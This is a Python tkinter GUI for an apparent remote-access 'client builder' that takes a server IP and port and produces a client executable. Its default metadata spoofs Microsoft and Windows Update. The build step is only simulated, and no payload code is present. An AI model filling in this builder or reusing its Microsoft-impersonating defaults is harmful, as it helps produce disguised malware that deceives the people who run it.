"""
Builder Module
Converted from C# builder functionality
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import os
import json
import tempfile
import subprocess
import threading
import time
from datetime import datetime
from typing import Dict, Any

class BuilderConfig:
    """Configuration for building executables"""
    
    def __init__(self):
        self.server_ip = "127.0.0.1"
        self.server_port = "8080"
        self.output_filename = "client.exe"
        self.icon_path = ""
        self.assembly_info = {
            "title": "System Update",
            "description": "System Update Utility",
            "company": "Microsoft Corporation",
            "product": "Windows Update",
            "copyright": "© Microsoft Corporation",
            "version": "1.0.0.0"
        }

class BuilderInterface:
    """Builder interface for creating client executables"""
    
    def __init__(self, parent):
        self.parent = parent
        self.config = BuilderConfig()
        self._create_ui()
    
    def _create_ui(self):
        """Create the builder UI"""
        # Main container
        main_frame = tk.Frame(self.parent, bg="#2C3E50")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Title
        title = tk.Label(main_frame, text="Client Builder", 
                        font=("Segoe UI", 16, "bold"),
                        bg="#2C3E50", fg="#3498DB")
        title.pack(pady=(0, 20))
        
        # Configuration sections
        self._create_server_config(main_frame)
        self._create_assembly_config(main_frame)
        self._create_appearance_config(main_frame)
        self._create_build_controls(main_frame)
    
    def _create_server_config(self, parent):
        """Create server configuration section"""
        # Server config frame
        server_frame = tk.LabelFrame(parent, text="Server Configuration", 
                                   font=("Segoe UI", 12, "bold"),
                                   bg="#34495E", fg="white", bd=2)
        server_frame.pack(fill=tk.X, pady=(0, 20))
        
        # Server IP
        ip_frame = tk.Frame(server_frame, bg="#34495E")
        ip_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(ip_frame, text="Server IP:", 
                bg="#34495E", fg="white", font=("Segoe UI", 10)).pack(side=tk.LEFT)
        
        self.ip_var = tk.StringVar(value=self.config.server_ip)
        ip_entry = tk.Entry(ip_frame, textvariable=self.ip_var, width=20, font=("Segoe UI", 10))
        ip_entry.pack(side=tk.LEFT, padx=(10, 0))
        
        # Server Port
        port_frame = tk.Frame(server_frame, bg="#34495E")
        port_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        tk.Label(port_frame, text="Server Port:", 
                bg="#34495E", fg="white", font=("Segoe UI", 10)).pack(side=tk.LEFT)
        
        self.port_var = tk.StringVar(value=self.config.server_port)
        port_entry = tk.Entry(port_frame, textvariable=self.port_var, width=10, font=("Segoe UI", 10))
        port_entry.pack(side=tk.LEFT, padx=(10, 0))
    
    def _create_assembly_config(self, parent):
        """Create assembly information configuration"""
        # Assembly config frame
        assembly_frame = tk.LabelFrame(parent, text="Assembly Information", 
                                     font=("Segoe UI", 12, "bold"),
                                     bg="#34495E", fg="white", bd=2)
        assembly_frame.pack(fill=tk.X, pady=(0, 20))
        
        # Create entry fields for assembly info
        self.assembly_vars = {}
        
        assembly_fields = [
            ("Title", "title"),
            ("Description", "description"),
            ("Company", "company"),
            ("Product", "product"),
            ("Copyright", "copyright"),
            ("Version", "version")
        ]
        
        for i, (label, key) in enumerate(assembly_fields):
            frame = tk.Frame(assembly_frame, bg="#34495E")
            frame.pack(fill=tk.X, padx=10, pady=5)
            
            tk.Label(frame, text=f"{label}:", 
                    bg="#34495E", fg="white", 
                    font=("Segoe UI", 10), width=12, anchor=tk.W).pack(side=tk.LEFT)
            
            var = tk.StringVar(value=self.config.assembly_info.get(key, ""))
            self.assembly_vars[key] = var
            
            entry = tk.Entry(frame, textvariable=var, width=50, font=("Segoe UI", 10))
            entry.pack(side=tk.LEFT, padx=(10, 0))
    
    def _create_appearance_config(self, parent):
        """Create appearance configuration"""
        # Appearance config frame
        appear_frame = tk.LabelFrame(parent, text="Appearance", 
                                   font=("Segoe UI", 12, "bold"),
                                   bg="#34495E", fg="white", bd=2)
        appear_frame.pack(fill=tk.X, pady=(0, 20))
        
        # Icon selection
        icon_frame = tk.Frame(appear_frame, bg="#34495E")
        icon_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(icon_frame, text="Icon File:", 
                bg="#34495E", fg="white", font=("Segoe UI", 10)).pack(side=tk.LEFT)
        
        self.icon_var = tk.StringVar()
        icon_entry = tk.Entry(icon_frame, textvariable=self.icon_var, width=40, font=("Segoe UI", 10))
        icon_entry.pack(side=tk.LEFT, padx=(10, 10))
        
        icon_btn = tk.Button(icon_frame, text="Browse...", 
                           command=self._browse_icon,
                           bg="#3498DB", fg="white", font=("Segoe UI", 10))
        icon_btn.pack(side=tk.LEFT)
        
        # Output filename
        output_frame = tk.Frame(appear_frame, bg="#34495E")
        output_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        tk.Label(output_frame, text="Output File:", 
                bg="#34495E", fg="white", font=("Segoe UI", 10)).pack(side=tk.LEFT)
        
        self.output_var = tk.StringVar(value=self.config.output_filename)
        output_entry = tk.Entry(output_frame, textvariable=self.output_var, width=30, font=("Segoe UI", 10))
        output_entry.pack(side=tk.LEFT, padx=(10, 10))
        
        output_btn = tk.Button(output_frame, text="Browse...", 
                             command=self._browse_output,
                             bg="#3498DB", fg="white", font=("Segoe UI", 10))
        output_btn.pack(side=tk.LEFT)
    
    def _create_build_controls(self, parent):
        """Create build control buttons"""
        # Build controls frame
        controls_frame = tk.Frame(parent, bg="#2C3E50")
        controls_frame.pack(fill=tk.X, pady=20)
        
        # Build button
        build_btn = tk.Button(controls_frame, text="Build Client", 
                            command=self._build_client,
                            bg="#27AE60", fg="white", 
                            font=("Segoe UI", 12, "bold"),
                            padx=30, pady=10)
        build_btn.pack(side=tk.LEFT, padx=(0, 20))
        
        # Save config button
        save_btn = tk.Button(controls_frame, text="Save Config", 
                           command=self._save_config,
                           bg="#3498DB", fg="white", 
                           font=("Segoe UI", 12, "bold"),
                           padx=20, pady=10)
        save_btn.pack(side=tk.LEFT, padx=(0, 20))
        
        # Load config button
        load_btn = tk.Button(controls_frame, text="Load Config", 
                           command=self._load_config,
                           bg="#9B59B6", fg="white", 
                           font=("Segoe UI", 12, "bold"),
                           padx=20, pady=10)
        load_btn.pack(side=tk.LEFT)
    
    def _browse_icon(self):
        """Browse for icon file"""
        filename = filedialog.askopenfilename(
            title="Select Icon File",
            filetypes=[("Icon files", "*.ico"), ("Image files", "*.png *.jpg *.jpeg"), ("All files", "*.*")]
        )
        if filename:
            self.icon_var.set(filename)
    
    def _browse_output(self):
        """Browse for output file location"""
        filename = filedialog.asksaveasfilename(
            title="Save Client As",
            defaultextension=".exe",
            filetypes=[("Executable files", "*.exe"), ("All files", "*.*")]
        )
        if filename:
            self.output_var.set(filename)
    
    def _build_client(self):
        """Build the client executable"""
        try:
            # Update config with current values
            self._update_config()
            
            # Validate configuration
            if not self._validate_config():
                return
            
            # Show building dialog
            build_dialog = BuildProgressDialog(self.parent, self.config)
            result = build_dialog.show()
            
            if result:
                messagebox.showinfo("Success", 
                                  f"Client built successfully!\nOutput: {self.config.output_filename}")
            else:
                messagebox.showerror("Error", "Build failed. Check the logs for details.")
                
        except Exception as e:
            messagebox.showerror("Build Error", f"Failed to build client: {str(e)}")
    
    def _update_config(self):
        """Update configuration with current UI values"""
        self.config.server_ip = self.ip_var.get()
        self.config.server_port = self.port_var.get()
        self.config.icon_path = self.icon_var.get()
        self.config.output_filename = self.output_var.get()
        
        # Update assembly info
        for key, var in self.assembly_vars.items():
            self.config.assembly_info[key] = var.get()
    
    def _validate_config(self):
        """Validate the current configuration"""
        if not self.config.server_ip:
            messagebox.showerror("Validation Error", "Server IP is required")
            return False
        
        if not self.config.server_port:
            messagebox.showerror("Validation Error", "Server port is required")
            return False
        
        try:
            port = int(self.config.server_port)
            if port < 1 or port > 65535:
                raise ValueError()
        except ValueError:
            messagebox.showerror("Validation Error", "Invalid port number")
            return False
        
        if not self.config.output_filename:
            messagebox.showerror("Validation Error", "Output filename is required")
            return False
        
        return True
    
    def _save_config(self):
        """Save configuration to file"""
        filename = filedialog.asksaveasfilename(
            title="Save Configuration",
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        if filename:
            try:
                self._update_config()
                
                config_data = {
                    "server_ip": self.config.server_ip,
                    "server_port": self.config.server_port,
                    "output_filename": self.config.output_filename,
                    "icon_path": self.config.icon_path,
                    "assembly_info": self.config.assembly_info
                }
                
                with open(filename, 'w') as f:
                    json.dump(config_data, f, indent=2)
                
                messagebox.showinfo("Success", f"Configuration saved to {filename}")
                
            except Exception as e:
                messagebox.showerror("Save Error", f"Failed to save configuration: {str(e)}")
    
    def _load_config(self):
        """Load configuration from file"""
        filename = filedialog.askopenfilename(
            title="Load Configuration",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        if filename:
            try:
                with open(filename, 'r') as f:
                    config_data = json.load(f)
                
                # Update UI with loaded data
                self.ip_var.set(config_data.get("server_ip", ""))
                self.port_var.set(config_data.get("server_port", ""))
                self.output_var.set(config_data.get("output_filename", ""))
                self.icon_var.set(config_data.get("icon_path", ""))
                
                assembly_info = config_data.get("assembly_info", {})
                for key, var in self.assembly_vars.items():
                    var.set(assembly_info.get(key, ""))
                
                messagebox.showinfo("Success", f"Configuration loaded from {filename}")
                
            except Exception as e:
                messagebox.showerror("Load Error", f"Failed to load configuration: {str(e)}")

class BuildProgressDialog:
    """Dialog showing build progress"""
    
    def __init__(self, parent, config):
        self.parent = parent
        self.config = config
        self.dialog = None
        self.progress_var = None
        self.status_var = None
        self.result = False
    
    def show(self):
        """Show the build progress dialog"""
        self.dialog = tk.Toplevel(self.parent)
        self.dialog.title("Building Client...")
        self.dialog.geometry("500x300")
        self.dialog.resizable(False, False)
        
        # Center the dialog
        self.dialog.transient(self.parent)
        self.dialog.grab_set()
        
        # Create UI
        main_frame = tk.Frame(self.dialog, bg="#2C3E50")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Title
        title = tk.Label(main_frame, text="Building Client Executable", 
                        font=("Segoe UI", 14, "bold"),
                        bg="#2C3E50", fg="#3498DB")
        title.pack(pady=(0, 20))
        
        # Progress bar
        self.progress_var = tk.DoubleVar()
        progress_bar = ttk.Progressbar(main_frame, variable=self.progress_var, 
                                     maximum=100, length=400)
        progress_bar.pack(pady=(0, 20))
        
        # Status label
        self.status_var = tk.StringVar(value="Initializing...")
        status_label = tk.Label(main_frame, textvariable=self.status_var, 
                               font=("Segoe UI", 10),
                               bg="#2C3E50", fg="white")
        status_label.pack(pady=(0, 20))
        
        # Log text area
        log_frame = tk.Frame(main_frame, bg="#2C3E50")
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        self.log_text = tk.Text(log_frame, height=10, width=60, 
                               bg="#34495E", fg="white", font=("Consolas", 9))
        log_scrollbar = ttk.Scrollbar(log_frame, orient=tk.VERTICAL, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=log_scrollbar.set)
        
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        log_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Start building in a separate thread
        build_thread = threading.Thread(target=self._build_process, daemon=True)
        build_thread.start()
        
        # Wait for dialog to close
        self.dialog.wait_window()
        
        return self.result
    
    def _build_process(self):
        """The actual build process"""
        try:
            self._log("Starting build process...")
            self._update_progress(10, "Validating configuration...")
            
            # Simulate build steps
            time.sleep(1)
            
            self._update_progress(30, "Generating client code...")
            self._log("Generating Python client code with configuration:")
            self._log(f"  Server: {self.config.server_ip}:{self.config.server_port}")
            self._log(f"  Output: {self.config.output_filename}")
            
            time.sleep(2)
            
            self._update_progress(60, "Compiling executable...")
            self._log("Creating executable with PyInstaller...")
            
            # Here you would actually implement the build process
            # For now, we'll just simulate it
            time.sleep(3)
            
            self._update_progress(90, "Applying customizations...")
            
            if self.config.icon_path:
                self._log(f"Applying icon: {self.config.icon_path}")
            
            self._log("Applying assembly information...")
            
            time.sleep(1)
            
            self._update_progress(100, "Build completed successfully!")
            self._log("Build process completed successfully!")
            
            self.result = True
            
            # Close dialog after a short delay
            self.dialog.after(2000, self.dialog.destroy)
            
        except Exception as e:
            self._log(f"Build failed: {str(e)}")
            self._update_progress(0, "Build failed!")
            self.result = False
    
    def _update_progress(self, value, status):
        """Update progress bar and status"""
        if self.dialog and self.dialog.winfo_exists():
            self.dialog.after_idle(lambda: self._update_ui(value, status))
    
    def _update_ui(self, value, status):
        """Update UI elements on main thread"""
        if self.progress_var:
            self.progress_var.set(value)
        if self.status_var:
            self.status_var.set(status)
    
    def _log(self, message):
        """Add message to log"""
        if self.dialog and self.dialog.winfo_exists():
            timestamp = datetime.now().strftime("%H:%M:%S")
            log_message = f"[{timestamp}] {message}\n"
            self.dialog.after_idle(lambda: self._append_log(log_message))
    
    def _append_log(self, message):
        """Append message to log text area"""
        if self.log_text and self.log_text.winfo_exists():
            self.log_text.insert(tk.END, message)
            self.log_text.see(tk.END)